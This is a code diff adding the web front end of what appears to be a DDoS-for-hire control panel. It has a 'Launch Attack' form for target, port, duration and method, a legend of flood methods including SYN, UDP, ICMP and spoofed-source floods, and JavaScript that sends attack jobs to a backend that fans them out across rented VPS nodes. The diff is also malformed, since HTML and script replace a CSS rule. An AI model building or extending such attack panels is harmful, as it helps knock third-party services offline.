@@ -217,5 +217,160 @@
     margin-bottom: 30px;
 }
 
-.info-card {
-    background: rgba
+            <div class="info-card">
+                <h4>Attack Status</h4>
+                <div id="attackStatus" class="status-idle">
+                    <i class="fas fa-info-circle"></i>
+                    Ready to launch attack
+                </div>
+            </div>
+            
+            <div class="info-card">
+                <h4>Available VPS</h4>
+                <div id="vpsStatus" class="vps-counter">
+                    <i class="fas fa-server"></i>
+                    <span id="vpsCount">0</span> nodes available
+                </div>
+            </div>
+        </div>
+
+        <div class="methods-legend">
+            <h4>Method Legend</h4>
+            <div class="legend-grid">
+                <div class="legend-item">
+                    <span class="method-tag syn">SYN</span>
+                    <span>SYN Flood - TCP synchronization</span>
+                </div>
+                <div class="legend-item">
+                    <span class="method-tag ack">ACK</span>
+                    <span>ACK Flood - TCP acknowledgment</span>
+                </div>
+                <div class="legend-item">
+                    <span class="method-tag icmp">ICMP</span>
+                    <span>ICMP Flood - Ping flood</span>
+                </div>
+                <div class="legend-item">
+                    <span class="method-tag udp">UDP</span>
+                    <span>UDP Flood - UDP packets</span>
+                </div>
+                <div class="legend-item">
+                    <span class="method-tag rand">RAND</span>
+                    <span>Random Source - Spoofed IPs</span>
+                </div>
+                <div class="legend-item">
+                    <span class="method-tag special">SPECIAL</span>
+                    <span>Special methods - Combined attacks</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// Initialize attack page
+function initAttackPage() {
+    loadVPSCount();
+    setupAttackForm();
+}
+
+// Load VPS count
+async function loadVPSCount() {
+    try {
+        const response = await fetch('/api/vps', {
+            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
+        });
+        
+        if (response.ok) {
+            const vpsList = await response.json();
+            document.getElementById('vpsCount').textContent = vpsList.length;
+        }
+    } catch (error) {
+        console.error('Error loading VPS count:', error);
+    }
+}
+
+// Setup attack form
+function setupAttackForm() {
+    const form = document.getElementById('attackForm');
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        await launchAttack();
+    });
+}
+
+// Launch attack
+async function launchAttack() {
+    const target = document.getElementById('target').value;
+    const port = document.getElementById('port').value;
+    const time = document.getElementById('time').value;
+    const method = document.getElementById('method').value;
+
+    if (!target || !port || !time || !method) {
+        updateAttackStatus('Please fill all fields', 'error');
+        return;
+    }
+
+    const button = document.querySelector('.btn-attack-large');
+    button.disabled = true;
+    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Launching...';
+
+    updateAttackStatus('Preparing attack...', 'preparing');
+
+    try {
+        const response = await fetch('/api/attack', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${localStorage.getItem('token')}`
+            },
+            body: JSON.stringify({ target, port, time, method })
+        });
+
+        const result = await response.json();
+        
+        if (response.ok) {
+            updateAttackStatus(`Attack launched! ${result.results.success}/${result.results.total} VPS activated`, 'success');
+            document.getElementById('attackForm').reset();
+        } else {
+            updateAttackStatus(`Error: ${result.error}`, 'error');
+        }
+    } catch (error) {
+        updateAttackStatus(`Network error: ${error.message}`, 'error');
+    } finally {
+        button.disabled = false;
+        button.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
+    }
+}
+
+// Update attack status
+function updateAttackStatus(message, type) {
+    const statusElement = document.getElementById('attackStatus');
+    statusElement.className = `status-${type}`;
+    
+    const icons = {
+        idle: 'fa-info-circle',
+        preparing: 'fa-spinner fa-spin',
+        success: 'fa-check-circle',
+        error: 'fa-exclamation-circle'
+    };
+    
+    statusElement.innerHTML = `<i class="fas ${icons[type]}"></i> ${message}`;
+}
+
+// Clear form
+function clearForm() {
+    document.getElementById('attackForm').reset();
+    updateAttackStatus('Ready to launch attack', 'idle');
+}
+
+// Clear status after delay
+setInterval(() => {
+    const statusElement = document.getElementById('attackStatus');
+    if (statusElement.classList.contains('status-success') || 
+        statusElement.classList.contains('status-error')) {
+        setTimeout(() => {
+            updateAttackStatus('Ready to launch attack', 'idle');
+        }, 5000);
+    }
+}, 1000);
+</script>
